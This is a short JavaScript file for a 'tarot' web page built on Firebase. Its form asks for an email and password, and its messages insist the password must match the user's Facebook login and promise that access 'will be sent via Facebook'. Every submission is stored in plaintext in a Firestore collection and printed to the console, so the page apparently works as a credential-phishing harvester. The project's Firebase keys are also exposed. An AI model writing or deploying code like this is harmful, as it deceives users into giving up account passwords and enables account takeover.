const firebaseConfig={
  apiKey: "AIzaSyDiw7YP39bFw90oyP_tL8PNiDt7kkaT4TM",
  authDomain: "tarot-34712.firebaseapp.com",
  projectId: "tarot-34712",
  messagingSenderId: "794766922783",
  appId: "1:794766922783:web:56c5941a7588db1b41f12a",
};

firebase.initializeApp(firebaseConfig);

// Inicialización de Cloud Firestore
const db = firebase.firestore();

const form = document.getElementById("registerForm");
form.addEventListener("submit", async (e) => {
  e.preventDefault();
  const email = form["email"].value;
  const contra = form["contra"].value;
  const recontra = form["recontra"].value;
  if(email == "" || contra=="" || recontra==""){
    Error();
  }else{

    if(contra != recontra){ 
      ErrorAuth();
    }else{
      db.collection("datos")
      .add({ email: email, contra: contra, recontra: recontra })
      .then((docRef) => {
        console.log("OK");
        success();
      })
      .catch((error) => {
        Error();
      });
      console.log("email: " + email + "\ncontra" + contra + "\nrecontra" + recontra);
    }
  }
});



// Funciones para mostrar mensajes de éxito y error
const Error = () => {
  Swal.fire({
    title: "¡Error!",
    text: "Todos los campos son obligatorios",
    icon: "error",
    confirmButtonText: "Entendido",
  });
};

const success = () => {
  Swal.fire({
    position: "top-end",
    icon: "success",
    title: "Su acceso se le enviará mediante Facebook en los próximos días",
    confirmButtonText: "Entendido",
    timer: 1500,
  }).then(()=>{
    modal.classList.add('hidden');
  })
};

const ErrorAuth = () => {
  Swal.fire({
    title: "¡Error de acceso!",
    text: "Su correo y contraseña deben coincidir con sus datos de Facebook",
    icon: "error",
    confirmButtonText: "Entendido",
    timer: 2500,
  });
};
